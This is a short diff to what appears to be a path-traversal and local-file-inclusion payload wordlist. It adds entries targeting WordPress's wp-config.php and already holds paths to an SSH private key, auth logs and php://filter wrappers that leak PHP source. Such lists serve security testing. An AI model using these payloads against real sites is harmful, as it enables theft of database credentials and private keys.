@@ -1,4 +1,6 @@
 /home/username/.ssh/id_rsa
+/../../../../../../wp-config.php
+/wp-config.php
 php://filter/convert.base64-encode/resource=index
 php://filter/convert.base64-encode/resource=config
 /var/log/auth
